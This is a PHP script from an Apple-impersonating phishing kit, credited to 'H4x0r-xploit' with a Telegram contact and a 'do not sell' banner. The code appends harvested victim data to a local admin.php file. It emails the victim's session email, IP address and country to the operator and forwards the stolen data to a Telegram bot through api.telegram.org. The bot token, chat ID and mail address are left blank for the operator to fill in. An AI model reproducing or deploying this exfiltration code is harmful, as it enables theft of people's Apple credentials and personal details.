<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Apple -
 * version 01
 * icq & telegram = https://t.me/H4x0rxploit
 
###############################################
#$            C0d3d by H4x0r-xploit          $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2021 Apple             $#
###############################################

**/

$yourmail  = '';

$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['Emailapp']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Apple" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="";
$chatId="";  
file_get_contents("https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=" . urlencode($yagmail)."" );